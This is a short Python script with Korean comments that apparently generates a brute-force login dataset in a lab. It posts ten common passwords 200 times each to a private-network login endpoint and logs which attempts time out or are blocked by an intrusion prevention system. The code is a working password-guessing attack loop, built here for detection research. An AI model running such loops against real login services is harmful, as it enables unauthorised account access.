import requests
import datetime
import time

# [설정] 분석가님의 환경에 맞춘 값
url = "http://192.168.2.100:5000/login"
log_file = "brute_force_blocked.log"

payloads = [
    {"username": "test", "password": "1111"},
    {"username": "test", "password": "1234"},
    {"username": "test", "password": "admin"},
    {"username": "test", "password": "password"},
    {"username": "test", "password": "qwer"},
    {"username": "test", "password": "asdf"},
    {"username": "test", "password": "zxcv"},
    {"username": "test", "password": "0000"},
    {"username": "test", "password": "9999"},
    {"username": "test", "password": "guest"},
]

# 200번 반복 x 10개 페이로드 = 총 2,000번
repeat_count = 200 

def write_log(message: str) -> None:
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(message + "\n")

print(f"🚀 [데이터셋 수집 시작] 총 {repeat_count * len(payloads)}번 시도합니다.")

attempt = 1
try:
    for r in range(1, repeat_count + 1):
        for data in payloads:
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            try:
                # IPS 탐지 시 차단(Timeout)을 확인하기 위해 timeout 설정
                res = requests.post(url, json=data, timeout=2)
                status = res.status_code
            except requests.RequestException:
                status = "Blocked/Timeout"

            log_line = f"{now} | brute_force | attempt={attempt} | user={data['username']} | pw={data['password']} | status={status}"
            
            # 진행 상황 실시간 모니터링 (100번마다 출력)
            if attempt % 100 == 0:
                print(f"⏳ 진행 중: {attempt} / 2000 완료")
            
            write_log(log_line)
            attempt += 1
            time.sleep(0.1) # 서버 부하 조절

except KeyboardInterrupt:
    print("\n⚠️ 수집이 중단되었습니다.")

print(f"✅ [완료] '{log_file}'에 모든 데이터가 저장되었습니다.")
